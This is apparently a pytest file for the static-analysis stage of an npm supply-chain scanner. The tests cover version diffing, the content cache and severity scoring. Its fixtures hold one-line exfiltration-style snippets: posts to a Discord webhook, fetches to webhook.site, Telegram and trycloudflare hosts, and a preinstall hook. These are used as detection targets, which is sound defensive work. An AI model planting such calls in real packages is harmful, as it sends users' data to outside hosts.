"""Stage 2 engine: new contents, attribution across a burst, and the content cache."""

import json
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from conftest import Router, TarEntry, make_tar_gz, sri_sha512
from kitsunox.core.models import (
    ArtifactRef,
    Candidate,
    Change,
    PackageBatch,
    PackageVersionRef,
    PublishInfo,
    Severity,
    VersionSnapshot,
)
from kitsunox.core.run import DataDir
from kitsunox.ecosystems.npm.registry import NpmEcosystem
from kitsunox.ecosystems.npm.rules.artifact import RULES as NPM_ARTIFACT_RULES
from kitsunox.rules.static import RULES
from kitsunox.stages.ingest import write_jsonl
from kitsunox.stages.static import (
    ArtifactFiles,
    ContentCache,
    Unavailable,
    analyse_batch,
    needs_retry,
    new_contents,
    record_static,
    static_run,
    unhashed,
)
from kitsunox.util.http import FetchError, TransientFetchError

T0 = datetime(2026, 10, 1, tzinfo=UTC)
BASE = {"index.js": b"module.exports = 1", "README.md": b"hi"}
BAD = {
    "index.js": b"module.exports = 1",
    "lib/x.js": b"post('https://discord.com/api/webhooks/1093847562019384756/x')",
    "README.md": b"hi",
}
CLEAN = {"index.js": b"module.exports = 2", "README.md": b"hi"}


def snapshot(version: str, minutes: int = 0, size: int | None = 100) -> VersionSnapshot:
    return VersionSnapshot(
        ref=PackageVersionRef(ecosystem="npm", name="kx", version=version),
        publish=PublishInfo(published_at=T0 + timedelta(minutes=minutes)),
        manifest={},
        artifact=ArtifactRef(
            url=f"https://r.test/kx-{version}.tgz", integrity="sha512-x", unpacked_size=size
        ),
    )


def candidate(version: str, minutes: int) -> Candidate:
    return Candidate(change=Change(new=snapshot(version, minutes)))


TREES = {"1.0.0": BASE, "1.0.1": BAD, "1.0.2": CLEAN}


def batch(base: VersionSnapshot | None = None) -> PackageBatch:
    return PackageBatch(
        ecosystem="npm",
        name="kx",
        base=base,
        versions=(candidate("1.0.1", 5), candidate("1.0.2", 10)),
    )


def test_new_contents_dedupes_and_keeps_first_version() -> None:
    items = list(new_contents(BASE, [("1.0.1", BAD), ("1.0.2", BAD | CLEAN)]))
    assert [(i.path, i.first_version) for i, _ in items] == [
        ("lib/x.js", "1.0.1"),
        ("index.js", "1.0.2"),
    ]
    assert len(list(new_contents(None, [("1", BASE)]))) == 2  # new package: everything is new


def test_reverted_payload_is_attributed_to_the_version_that_had_it(tmp_path: Path) -> None:
    result = analyse_batch(
        batch(snapshot("1.0.0")), lambda s: TREES[s.ref.version], ContentCache(tmp_path, RULES)
    )
    bad, clean = result.versions
    assert bad.history[-1].forwarded and bad.findings[0].evidence[0].path == "lib/x.js"
    assert not clean.history[-1].forwarded and clean.findings == ()
    assert clean.history[-1].reason == "no signal"


def test_unavailable_versions_and_base_are_explained(tmp_path: Path) -> None:
    def files(s: VersionSnapshot) -> dict[str, bytes] | Unavailable:
        return Unavailable(reason="gone") if s.ref.version != "1.0.2" else CLEAN

    result = analyse_batch(batch(snapshot("1.0.0")), files, ContentCache(None, RULES))
    bad, clean = result.versions
    assert bad.history[-1].reason == "files unavailable: gone; base unavailable: gone"
    assert not bad.history[-1].forwarded
    assert clean.history[-1].reason == "no signal; base unavailable: gone"


class FakeEcosystem:
    def __init__(self) -> None:
        self.fetched: list[str] = []

    def fetch_artifact(self, artifact: ArtifactRef) -> dict[str, bytes]:
        self.fetched.append(artifact.url)
        if "1.0.2" in artifact.url:
            raise FetchError("HTTP 404")
        if "1.0.3" in artifact.url:
            raise TransientFetchError("timed out")
        return BAD


def test_artifact_files_skips_oversize_and_reports_fetch_errors() -> None:
    ecosystem = FakeEcosystem()
    files = ArtifactFiles(ecosystem, max_bytes=1000)  # type: ignore[arg-type]
    assert files(snapshot("1.0.1")) == BAD
    assert files(snapshot("1.0.1", size=1001)) == Unavailable(
        reason="declared unpacked size 1001 bytes"
    )
    assert files(snapshot("1.0.2")) == Unavailable(reason="FetchError: HTTP 404")
    assert files(snapshot("1.0.3")) == Unavailable(
        reason="TransientFetchError: timed out", transient=True
    )
    no_artifact = snapshot("1.0.1").model_copy(update={"artifact": None})
    assert files(no_artifact) == Unavailable(reason="no artifact")
    assert len(ecosystem.fetched) == 3  # the oversize one was never downloaded


@pytest.mark.parametrize("base", [None, "1.0.0"])
def test_static_run_reads_batches_and_writes_results(tmp_path: Path, base: str | None) -> None:
    write_jsonl(tmp_path / "batches.jsonl", [batch(snapshot(base) if base else None)])
    (result,) = static_run(
        tmp_path, lambda s: TREES[s.ref.version], ContentCache(tmp_path / "cache", RULES)
    )
    assert [c.history[-1].forwarded for c in result.versions] == [True, False]
    assert PackageBatch.load_json((tmp_path / "static.jsonl").read_bytes()) == result


def test_cache_is_reused_and_keyed_by_rule_versions(tmp_path: Path) -> None:
    cache = ContentCache(tmp_path, RULES)
    first = cache.matches("ab" * 32, b"eval(x)")
    files = list(tmp_path.rglob("*.json"))
    assert len(files) == 1
    assert (
        cache.matches("ab" * 32, b"different bytes, same claimed hash") == first
    )  # served from disk
    assert ContentCache(tmp_path, RULES[:1]).dir != cache.dir


def test_damaged_cache_entry_is_recomputed(tmp_path: Path) -> None:
    cache = ContentCache(tmp_path, RULES)
    first = cache.matches("ab" * 32, b"eval(x)")
    (entry,) = tmp_path.rglob("*.json")
    entry.write_bytes(b'[{"ru\xf8le')
    assert cache.matches("ab" * 32, b"eval(x)") == first
    assert json.loads(entry.read_bytes())  # rewritten


def test_record_static_fetches_verifies_and_records(tmp_path: Path, router: Router) -> None:
    data = DataDir(tmp_path)
    tarball = make_tar_gz([TarEntry(f"package/{path}", content) for path, content in BAD.items()])
    good = snapshot("1.0.1").model_copy(
        update={
            "artifact": ArtifactRef(
                url="https://r.test/kx-1.0.1.tgz", integrity=sri_sha512(tarball)
            )
        }
    )
    router.add_bytes("https://r.test/kx-1.0.1.tgz", tarball)
    run_dir = data.run_dir("r1")
    write_jsonl(
        run_dir / "batches.jsonl",
        [
            PackageBatch(
                ecosystem="npm",
                name="kx",
                base=None,
                versions=(Candidate(change=Change(new=good)),),
            )
        ],
    )
    (result,) = record_static(data, "r1", NpmEcosystem, client=router.client())
    (version,) = result.versions
    assert version.history[-1].forwarded
    assert (run_dir / "static-snapshot.json").exists()
    assert (run_dir / "static.jsonl").exists()
    # A second pass is served from the immutable blob store, not the network.
    record_static(data, "r1", NpmEcosystem, client=router.client())
    assert router.requests == ["https://r.test/kx-1.0.1.tgz"]


def test_artifact_rules_see_each_available_version(tmp_path: Path) -> None:
    hidden = BAD | {"package.json": b'{"scripts": {"preinstall": "node x.js"}}'}
    trees: dict[str, dict[str, bytes] | Unavailable] = {
        "1.0.1": hidden,
        "1.0.2": Unavailable(reason="gone"),
    }
    result = analyse_batch(
        batch(),
        lambda s: trees[s.ref.version],
        ContentCache(None, RULES),
        artifact_rules=NPM_ARTIFACT_RULES,
    )
    bad, gone = result.versions
    assert "npm.artifact.hidden-install-script" in bad.history[-1].reason
    assert bad.findings[0].rule_id == "npm.artifact.hidden-install-script"  # artifact first
    assert gone.findings == ()


def test_network_failures_are_marked_for_retry() -> None:
    def files(s: VersionSnapshot) -> dict[str, bytes] | Unavailable:
        if s.ref.version == "1.0.0":
            return BASE
        return Unavailable(reason="TransientFetchError: x", transient=True)

    result = analyse_batch(batch(snapshot("1.0.0")), files, ContentCache(None, RULES))
    assert result.versions[0].history[-1].reason == (
        "files unavailable, will retry: TransientFetchError: x"
    )
    assert needs_retry([result])
    assert not needs_retry(
        [analyse_batch(batch(), lambda s: TREES[s.ref.version], ContentCache(None, RULES))]
    )


def test_a_match_the_previous_version_had_is_low_and_says_so(tmp_path: Path) -> None:
    """A changed file is matched whole: its old matches would fire again every release."""
    hook = b"post('https://discord.com/api/webhooks/1093847562019384756/x')\n"
    trees = {
        "1.0.0": {"lib/x.js": hook, "README.md": b"see https://webhook.site/abc"},
        "1.0.1": {
            "lib/x.js": hook + b"// a change elsewhere in the file\n",
            "README.md": b"see https://webhook.site/abc today",  # docs: never runs
            "lib/new.js": b"fetch('https://webhook.site/0b1c2d3e')",  # new: stays HIGH
        },
    }
    one = PackageBatch(
        ecosystem="npm", name="kx", base=snapshot("1.0.0"), versions=(candidate("1.0.1", 5),)
    )
    (result,) = analyse_batch(
        one, lambda s: trees[s.ref.version], ContentCache(tmp_path, RULES)
    ).versions
    by_path = {
        f.evidence[0].path: f for f in result.findings if f.rule_id == "static.exfil-endpoint"
    }
    assert by_path["lib/new.js"].severity is Severity.HIGH
    old = by_path["lib/x.js"]
    assert (old.severity, old.weight) == (Severity.LOW, 1.0)
    assert old.explanation.endswith("not new in this release.")
    docs = by_path["README.md"]
    assert docs.severity is Severity.LOW  # in the previous README too, and docs anyway
    fresh = {"1.0.0": {}, "1.0.1": {"docs/guide.md": b"curl https://webhook.site/x"}}
    (only_docs,) = analyse_batch(
        one, lambda s: fresh[s.ref.version], ContentCache(tmp_path, RULES)
    ).versions
    (finding,) = only_docs.findings
    assert finding.severity is Severity.LOW and "doesn't run" in finding.explanation


def test_a_hashed_chunk_is_compared_with_the_base_chunk_of_the_same_name(tmp_path: Path) -> None:
    """`@camstack/addon-post-analysis` 1.2.654: the chunk's name changes with its content."""
    note = b"// a Quick tunnel's random `*.trycloudflare.com`\n"
    trees = {
        "1.0.0": {"dist/registry-BX6j2lnF.mjs": note, "dist/other-0HGmZj7D.mjs": b"1"},
        "1.0.1": {
            "dist/registry-CFQBxtE2.mjs": note + b"export const a = 2\n",
            "dist/other-9QmZk1Pa.mjs": b"fetch('https://x.trycloudflare.com')",  # other name
        },
    }
    one = PackageBatch(
        ecosystem="npm", name="kx", base=snapshot("1.0.0"), versions=(candidate("1.0.1", 5),)
    )
    (result,) = analyse_batch(
        one, lambda s: trees[s.ref.version], ContentCache(tmp_path, RULES)
    ).versions
    by_path = {
        f.evidence[0].path: f for f in result.findings if f.rule_id == "static.exfil-endpoint"
    }
    assert by_path["dist/registry-CFQBxtE2.mjs"].severity is Severity.LOW
    assert by_path["dist/other-9QmZk1Pa.mjs"].severity is Severity.HIGH


def test_every_base_chunk_of_a_name_is_compared(tmp_path: Path) -> None:
    """`@wirecat/*`: esbuild calls every chunk `chunk-<HASH>.js`; the bundled ngrok region table
    was in the base's sixth, and was HIGH again in each release."""
    base = {f"dist/chunk-{c}AAAAAA1.js": b"export const x = 1" for c in "ABCDE"}
    base["dist/chunk-FAAAAAA1.js"] = b'const regions = ["eu.ngrok.io"]'
    new = {"dist/chunk-ZZZZZZZ9.js": b'const regions = ["eu.ngrok.io"]; // moved'}
    trees = {"1.0.0": base, "1.0.1": new}
    one = PackageBatch(
        ecosystem="npm", name="kx", base=snapshot("1.0.0"), versions=(candidate("1.0.1", 5),)
    )
    (result,) = analyse_batch(
        one, lambda s: trees[s.ref.version], ContentCache(tmp_path, RULES)
    ).versions
    (found,) = [f for f in result.findings if f.rule_id == "static.exfil-endpoint"]
    assert found.severity is Severity.LOW


def test_a_new_file_is_compared_with_all_of_the_base_s_code(tmp_path: Path) -> None:
    """`@stacksjs/ts-cloud`: Bun names chunks `chunk-eevqxagd.js`, which `unhashed` can't tell
    from a word, so its Telegram notifier read as new in every release. A file with no
    counterpart is compared with what any base code file matched; one with a counterpart, and
    base docs, still don't count."""
    base = {
        "dist/bin/chunk-eevqxagd.js": b"fetch(`https://api.telegram.org/bot${t}/sendMessage`)",
        "lib/index.js": b"export const x = 1",
        "README.md": b"Inspect requests at https://webhook.site/abc",
    }
    new = {
        "dist/bin/chunk-jcehsvnm.js": b"fetch(`https://api.telegram.org/bot${t}/sendMessage`);",
        "lib/index.js": b"fetch(`https://api.telegram.org/bot${t}/getMe`)",
        "dist/bin/chunk-qwertyui.js": b"post('https://webhook.site/xyz')",
    }
    trees = {"1.0.0": base, "1.0.1": new}
    one = PackageBatch(
        ecosystem="npm", name="kx", base=snapshot("1.0.0"), versions=(candidate("1.0.1", 5),)
    )
    (result,) = analyse_batch(
        one, lambda s: trees[s.ref.version], ContentCache(tmp_path, RULES)
    ).versions
    severity = {
        (f.evidence[0].path, f.explanation.split(".")[0]): f.severity
        for f in result.findings
        if f.rule_id == "static.exfil-endpoint"
    }
    assert severity == {
        ("dist/bin/chunk-jcehsvnm.js", "Found `api"): Severity.LOW,  # elsewhere in the base
        ("lib/index.js", "Found `api"): Severity.HIGH,  # new to its own counterpart
        ("dist/bin/chunk-qwertyui.js", "Found `webhook"): Severity.HIGH,  # only in base docs
    }


@pytest.mark.parametrize(
    ("path", "name"),
    [
        ("dist/clip-model-registry-BX6j2lnF.mjs", "dist/clip-model-registry.mjs"),
        ("static/js/main.3f2a9b1c.js", "static/js/main.js"),
        ("chunk-ABCD1234.cjs", "chunk.cjs"),
        # glimmervoid 0.48.x: Vite hashes without a digit, or with `-`
        ("dist/client/assets/settings-panel-Bkki_GMk.js", "dist/client/assets/settings-panel.js"),
        ("dist/client/assets/settings-panel-DPGhQMPB.js", "dist/client/assets/settings-panel.js"),
        ("dist/client/assets/settings-panel-CnQC9-zc.js", "dist/client/assets/settings-panel.js"),
        ("dist/editor-Markdown.js", None),
        ("dist/model-registry.js", None),  # a word, not a hash
        ("dist/a-BX6j2lnF.css", None),
        ("lib/index.js", None),
    ],
)
def test_unhashed(path: str, name: str | None) -> None:
    assert unhashed(path) == name


def test_any_rule_matching_only_in_a_file_that_never_runs_is_low(tmp_path: Path) -> None:
    """`@atairo/qixi` 0.1.3: an IP in a bundled dependency's README was MEDIUM."""
    trees = {
        "1.0.0": {},
        "1.0.1": {
            "node_modules/agent/README.md": b"proxy http://168.63.76.32:3128 here",
            "lib/x.js": b"get('http://168.63.76.32:3128/x')",
        },
    }
    one = PackageBatch(
        ecosystem="npm", name="kx", base=snapshot("1.0.0"), versions=(candidate("1.0.1", 5),)
    )
    (result,) = analyse_batch(
        one, lambda s: trees[s.ref.version], ContentCache(tmp_path, RULES)
    ).versions
    by_path = {f.evidence[0].path: f for f in result.findings if f.rule_id == "static.hardcoded-ip"}
    assert by_path["node_modules/agent/README.md"].severity is Severity.LOW
    assert by_path["lib/x.js"].severity is Severity.MEDIUM
